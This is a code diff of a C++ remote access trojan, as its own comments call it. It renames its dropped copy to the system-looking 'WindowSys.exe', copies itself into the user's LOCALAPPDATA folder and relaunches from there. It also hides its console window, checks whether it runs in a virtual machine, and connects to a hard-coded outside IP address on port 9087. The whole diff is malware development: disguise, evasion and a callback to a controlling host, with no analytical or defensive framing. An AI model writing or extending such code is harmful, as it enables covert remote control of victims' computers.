@@ -12,8 +12,7 @@ bool vmCheck() {
     return ((info[2] >> 31) == 1); //if its 1 so the exe running on vm if not so its running on physical machine
 }
 
-
-//Creating a new same RAT in C:\\C_projects\\test001.exe
+//Creating a new same RAT in C:\\C_projects\\WindowSys.exe
 bool moveFilePlace() {
     TCHAR szExeFileName[MAX_PATH];
     ::GetModuleFileNameA(NULL, szExeFileName, MAX_PATH);
@@ -23,9 +22,9 @@ bool moveFilePlace() {
     }
 
     string path = getenv("LOCALAPPDATA");
-    path += "\\test001.exe";
+    path += "\\WindowSys.exe";
 
-    if (!fileName.rfind("test001.exe")) {
+    if (!fileName.rfind("WindowSys.exe")) {
         return false;
     }
 
@@ -60,17 +59,16 @@ bool moveFilePlace() {
 }
 
 int main() {
-
-    //Checking if the file test001.exe is exist
-    if (!moveFilePlace()) {
+    //Checking if the file WindowSys.exe is exist
+    if (moveFilePlace()) {
         string path = getenv("LOCALAPPDATA");
-        cout << "The command is " << "cd " + path + "&& start test001.exe" << endl;
-        system(("cd " + path + "&& start test001.exe").c_str());
+        cout << "The command is " << "cd " + path + "&& start WindowSys.exe" << endl;
+        system(("cd " + path + "&& start WindowSys.exe").c_str());
         return 0;
     } else {
-        //::ShowWindow(::GetConsoleWindow(), SW_SHOW);
+        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
         string ip = "141.226.121.68";
-        //string ip = "127.0.0.1";
+        //string ip = "192.168.1.210";
         int port = 9087;
         Connection *connection = new Connection(ip, port);
         BOOL success = connection->boot();
